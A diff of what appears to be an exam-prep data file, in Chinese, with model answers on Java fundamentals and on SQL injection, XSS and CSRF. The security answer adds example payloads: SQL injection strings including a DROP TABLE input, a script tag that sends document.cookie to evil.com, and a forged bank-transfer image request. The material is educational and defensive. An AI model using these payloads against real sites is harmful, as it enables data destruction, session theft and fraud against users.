@@ -872,65 +872,99 @@ int main() {
 (一) Java 中基本型別(Primitive Type)與參考型別(Reference Type)差異為何？（5分）
 (二) Java 的垃圾回收機制(Garbage Collection)如何運作（3分）？何時觸發（3分）？
 (三) Java 物件導向的三大特性為封裝、繼承、多型，請分別說明其定義與如何在 Java 中實現。（9分）`,
-      answer: `**(一) 基本型別 vs 參考型別（5分）**
-
+      answer: `
+**(一) 基本型別 vs 參考型別（5分）**
 | 比較項 | 基本型別 Primitive | 參考型別 Reference |
 |---|---|---|
-| 種類 | byte, short, int, long, float, double, char, boolean（共 8 種） | 類別、介面、陣列、String、包裝類別等 |
-| 儲存內容 | 變數**直接儲存「值」本身** | 變數儲存的是**指向物件的「位址（參考）」**，物件本體在堆積（Heap） |
+| 種類 | byte, short, int, long, float, double, char, boolean（共 8 種） | 類別、介面、陣列、列舉（Enum） |
+| 儲存內容 | 變數直接存放「實際的值」 | 變數存放的是物件的「參考（位址）」|
 | 記憶體位置 | 區域變數放在堆疊（Stack） | 參考放在 Stack，物件實體放在 Heap |
 | 預設值 | 0 / 0.0 / false / '\\u0000' | null |
-| 傳遞方式 | 傳值（pass-by-value）：複製「值」本身 | pass-by-value：複製「位址值」→ 可透過位址修改原物件內容，但重新賦值不影響原物件 |
+| 方法呼叫 | call-by-value（複製實際的值） | call-by-value（複製參考的值，兩者指向同一物件）|
 | 是否可為 null | 不可 | 可 |
 
 例：\`int a = 5;\` 變數 a 裡就是 5；\`String s = new String("hi");\` 變數 s 裡是一個位址，"hi" 物件在 Heap。
 
 **(二) 垃圾回收機制（GC）（6分）**
-
 *如何運作（3分）*
-- JVM 自動管理 Heap 記憶體。GC 透過**可達性分析（Reachability Analysis）**，從「GC Roots」（如執行緒堆疊中的區域變數、靜態變數、JNI 參考）出發追蹤所有可被存取到的物件。
-- **追蹤不到的物件 = 無人參考 = 垃圾**，其佔用的記憶體會被回收。
-- 常見演算法：標記-清除（Mark-Sweep）、標記-整理（Mark-Compact）、複製（Copying）。
-- 現代 JVM 採**分代回收（Generational GC）**：Heap 分為新生代（Young，含 Eden + 兩個 Survivor）與老年代（Old）。新物件先放 Eden，多次回收後存活者晉升老年代。新生代用 Minor GC（快、頻繁），老年代用 Major/Full GC（慢）。
+- **判斷垃圾（可達性分析）**：從 GC Roots 出發（stack 中的區域變數、靜態變數、活動執行緒等），沿參考鏈走訪，可到達的物件視為存活；無法到達的即為垃圾。
+- **回收垃圾**（常見演算法）：標記-清除（Mark-Sweep）、標記-整理（Mark-Compact）、複製（Copying）。
+- **分代回收**：heap 分為年輕代（Eden＋Survivor）與老年代。新物件先配置在 Eden，存活者經 Minor GC 移至 Survivor，多次存活後晉升老年代。因為多數物件生命週期很短，分代能提高回收效率。
 
 *何時觸發（3分）*
-- 新生代 Eden 區空間不足時，觸發 **Minor GC**。
-- 老年代空間不足、或晉升失敗時，觸發 **Major GC / Full GC**。
-- 呼叫 \`System.gc()\` 時「建議」JVM 執行 GC（僅是建議，不保證立即執行）。
-- 注意：GC 觸發時機由 JVM 自行決定，程式設計師**無法精確控制**。
+- **Minor GC**：Eden 空間不足時觸發，只回收年輕代，速度快。。
+- **Major／Full GC**：老年代空間不足（含物件晉升失敗）時觸發，回收整個 heap，耗時較長。。
+- 主動呼叫 \`System.gc()\` ：只是向 JVM 提出建議，是否執行由 JVM 決定。
 
 **(三) 物件導向三大特性（9分）**
-
 *1. 封裝（Encapsulation）*
-- **定義**：把資料（屬性）與操作資料的方法包裝在一起，並隱藏內部實作細節，只對外開放必要介面。
-- **Java 實現**：將實體變數宣告為 \`private\`，提供 \`public\` 的 getter/setter 方法存取，並在 setter 中加入驗證邏輯。
+- **定義**：將資料（屬性）與操作資料的方法包裝在同一個類別中，隱藏內部實作細節，只對外公開必要的介面，提高安全性與可維護性。
+- **Java 實現**：欄位設為 \`private\`，透過 \`public\` 的 getter/setter 存取。
 \`\`\`java
-class Account {
-    private double balance;            // 隱藏
-    public double getBalance() { return balance; }
-    public void deposit(double amt) {  // 受控存取
-        if (amt > 0) balance += amt;
+class Person {
+    private String name;
+    public Person(String name) {
+        this.name = name;
+    }
+    public String getName() {
+        return name;
+    }
+    public void setName(String name) {
+        this.name = name;
     }
 }
 \`\`\`
 
 *2. 繼承（Inheritance）*
-- **定義**：子類別承襲父類別的屬性與方法，達到程式碼重用，並可擴充或修改行為，形成「is-a」關係。
-- **Java 實現**：使用 \`extends\` 關鍵字。Java 只支援單一繼承（一個類別只能 extends 一個父類別），但可 \`implements\` 多個介面。
+- **定義**：子類別取得父類別的屬性與方法，達到程式碼重用，並可擴充或覆寫（Override）父類別行為，形成「is-a」關係。
+- **Java 實現**：使用 \`extends\` ;子類別以 \`super(...)\` 呼叫父類別建構子，以 \`super.方法()\` 呼叫父類別方法。Java 只支援單一繼承（一個類別只能 extends 一個父類別），但可 \`implements\` 多個介面。
 \`\`\`java
-class Animal { void eat() { } }
-class Dog extends Animal { void bark() { } }  // Dog 繼承 Animal
+class Animal {
+    private String name;
+    public Animal(String name) {
+        this.name = name;
+    }
+    public String getName() {
+        return name;
+    }
+    public void speak() {
+        System.out.println("動物發出聲音");
+    }
+}
+class Dog extends Animal {
+    public Dog(String name) {
+        super(name);          // 呼叫父類別建構子
+    }
+    @Override
+    public void speak() {
+        System.out.println(getName() + " 汪汪");
+    }
+}
 \`\`\`
 
 *3. 多型（Polymorphism）*
-- **定義**：同一個介面或父類別參考，在執行期依實際物件型別表現出不同行為。「一個介面，多種實作」。
+- **定義**：同一個方法呼叫，因實際物件型別不同而有不同行為。
 - **Java 實現**：
-  - **覆寫（Overriding）**：子類別重新定義父類別方法，執行期動態繫結（dynamic binding）。
-  - **超載（Overloading）**：同名方法不同參數列，編譯期決定。
-  - 父類別參考指向子類別物件：\`Animal a = new Dog(); a.eat();\` 實際呼叫 Dog 版本。
+  - **覆寫（Overriding）＋向上轉型**：父類別參考指向子類別物件，執行時依實際物件決定呼叫哪個方法（動態繫結，執行期決定）。
+  - **超載（Overloading）**：同名方法、參數不同，編譯期決定（靜態多型）。
 \`\`\`java
-Animal[] arr = { new Dog(), new Cat() };
-for (Animal a : arr) a.makeSound();  // 各自呼叫對應實作
+class Cat extends Animal {
+    public Cat(String name) {
+        super(name);
+    }
+    @Override
+    public void speak() {
+        System.out.println(getName() + " 喵喵");
+    }
+}
+public class Main {
+    public static void main(String[] args) {
+        Animal a1 = new Dog("小黑");   // 向上轉型
+        Animal a2 = new Cat("小花");
+        a1.speak();   // 小黑 汪汪
+        a2.speak();   // 小花 喵喵
+    }
+}
 \`\`\``,
       code: null
     },
@@ -944,41 +978,53 @@ for (Animal a : arr) a.makeSound();  // 各自呼叫對應實作
 (三) CSRF`,
       answer: `**(一) SQL Injection（SQL 隱碼攻擊）（5分）**
 
-*行為原理*：攻擊者在輸入欄位（帳號、搜尋框、URL 參數）注入惡意 SQL 片段。若程式以「字串拼接」方式組合 SQL 指令，注入的內容會被資料庫當作指令的一部分執行。
-- 經典例：登入查詢 \`SELECT * FROM users WHERE name='[輸入]'\`，攻擊者輸入 \`' OR '1'='1\`，使條件恆真而繞過驗證；甚至 \`'; DROP TABLE users; --\` 刪除資料表。
-- *危害*：竊取、竄改、刪除整個資料庫，繞過認證。
+**行為原理**：應用程式把使用者輸入**直接拼接到 SQL 語句**中，攻擊者在輸入欄位輸入特殊字串，改變原本 SQL 的語意，使資料庫執行非預期的指令。
+- **範例**：原始語句 \`SELECT * FROM users WHERE name='[輸入]'\`，攻擊者輸入 \`' OR '1'='1\`，使條件恆真而繞過驗證；甚至 \`'; DROP TABLE users; --\` 刪除資料表。
+- **危害**：竊取機密資料、竄改或刪除資料、繞過身分驗證，嚴重時取得系統控制權。
 
-*防禦*：
-1. **參數化查詢 / Prepared Statement**（最有效）：將 SQL 結構與資料分離，輸入永遠被當作「資料」而非「指令」。
-2. 輸入驗證與白名單過濾，限制長度、型別、格式。
-3. 使用 ORM 框架。
-4. 最小權限原則：應用程式連線帳號只給必要權限。
-5. 關閉詳細錯誤訊息，避免洩漏資料庫結構。
+**防禦方式**：
+1. **參數化查詢 / Prepared Statement**：將 SQL 結構與資料分離，輸入永遠被當作「資料」而非「指令」。
+2. **輸入驗證（白名單）**：限制輸入的型別、格式與長度，只允許預期的內容。
+3. **使用 ORM 框架**：預設使用參數化查詢。
+4. **最小權限原則**：應用程式連線帳號只給必要權限。
+5. **關閉錯誤訊息**：避免洩漏資料庫結構。
+6. **其他**：部署 WAF（Web 應用程式防火牆）、定期弱點掃描與滲透測試。
 
 **(二) Cross-Site Scripting, XSS（跨站腳本攻擊）（5分）**
 
-*行為原理*：攻擊者將惡意 JavaScript 注入網頁，當其他使用者瀏覽該頁面時，惡意腳本在「受害者瀏覽器」中執行，竊取 Cookie/Session、偽造操作、釣魚。
+**行為原理**：應用程式未對使用者輸入做適當處理，就把內容輸出到網頁，攻擊者便能注入惡意 JavaScript。其他使用者瀏覽該頁面時，瀏覽器因信任該網站而執行惡意腳本，攻擊者即可竊取 cookie、session，冒充使用者。
+- **範例**：在留言版輸入 \`<script>fetch('https://evil.com?c=' + document.cookie)<\/script>\`，網站若直接顯示，所有看到該留言的人都會把 cookie 送給攻擊者。
+- **危害**：竊取 session 冒充身分、竄改頁面內容、導向惡意網站、側錄鍵盤輸入。
+三種類型：
 - **儲存型（Stored）**：惡意腳本存進資料庫（如留言板），所有瀏覽者都中招。
 - **反射型（Reflected）**：惡意腳本藏在 URL 參數，伺服器原樣回填到網頁，誘騙受害者點擊連結。
 - **DOM 型**：純前端 JS 不當處理使用者輸入造成。
 
-*防禦*：
-1. **輸出編碼（Output Encoding）**：將輸出到 HTML 的特殊字元（\`< > & " '\`）轉為 HTML 實體，使其無法被當成標籤執行。
-2. 輸入驗證與淨化（sanitize）。
-3. 設定 **Content Security Policy（CSP）**，限制可執行的腳本來源。
-4. Cookie 加上 **HttpOnly** 屬性，使 JS 無法讀取 Cookie。
+**防禦方式**：
+1. **輸出編碼（Output Encoding）**：將（\`<\`、\`>\`、\`&\`、\`"\`）等特殊字元轉成 HTML 實體（如 \`&lt;\`），使其無法被當成標籤執行。
+2. **HttpOnly Cookie**：禁止 JavaScript 讀取 cookie，即使被 XSS 也偷不到 session。
+3. **輸入驗證**：以白名單限制輸入格式與長度。
+4. **CSP（Content Security Policy）**：限制可載入與執行的腳本來源，禁止內嵌腳本。
+5. **使用現代框架**：如 React、Vue 預設會跳脫輸出
+6. **其他**：Cookie 加 Secure、SameSite 屬性。
 
 **(三) CSRF（Cross-Site Request Forgery，跨站請求偽造）（5分）**
 
-*行為原理*：攻擊者誘騙「已登入」的受害者，在不知情下對目標網站送出非預期的請求。由於瀏覽器會自動附帶該網站的 Cookie，伺服器誤認為是受害者本人的合法操作。
-- 例：受害者已登入網銀，點到攻擊者佈置的惡意頁面，頁面自動送出轉帳請求；伺服器看到合法 Cookie 就執行轉帳。
-- **XSS 是「偷使用者的信任」，CSRF 是「偷網站對使用者的信任」。**
+**行為原理**：攻擊者誘騙「已登入」的受害者，在不知情下對目標網站送出非預期的請求。由於瀏覽器會自動附帶該網站的 Cookie，伺服器誤認為是受害者本人的合法操作。
+- **範例**：受害者已登入網銀，點到攻擊者佈置的惡意頁面，頁面中藏有 \`<img src="https://bank.com/transfer?to=attacker&amount=10000">\`，瀏覽器自動帶上 Cookie 送出轉帳請求，伺服器看到合法 Cookie 就執行轉帳。
+- **危害**：未經授權轉帳、修改密碼或 Email、刪除資料、變更帳號設定。
 
-*防禦*：
-1. **CSRF Token**：每個表單嵌入一組伺服器產生的隨機、不可預測的 token，提交時驗證。攻擊者無法得知 token。
-2. 設定 Cookie 的 **SameSite** 屬性（Strict/Lax），限制跨站請求自動帶 Cookie。
-3. 驗證 HTTP **Referer / Origin** 標頭。
-4. 重要操作要求二次驗證（密碼、OTP、驗證碼）。`,
+**防禦方式**：
+1. **CSRF Token**：每個表單嵌入一組伺服器產生的隨機、不可預測的 token，提交時驗證，因攻擊者無法得知 token，偽造的請求會被拒絕。。
+2. **SameSite Cookie 屬性**：設為 \`Strict\` 或 \`Lax\`，限制跨站請求自動帶 Cookie。
+3. **驗證 Referer / Origin 標頭**：確認請求來自自己的網站。
+4. **重要操作二次驗證**：轉帳、改密碼等要求輸入密碼、OTP 或驗證碼。
+5. **其他**：敏感操作使用 POST 而非 GET；要求自訂標頭（如 \`X-CSRF-Token\`）。
+
+**總結**
+- SQL Injection：資料被當成 SQL 指令 執行（目標：資料庫）。
+- XSS：資料被當成 網頁程式碼 執行（目標：使用者瀏覽器）。
+- CSRF：偽造請求借用使用者的登入身分（目標：已登入的網站）。`,
       code: null
     }
   ]
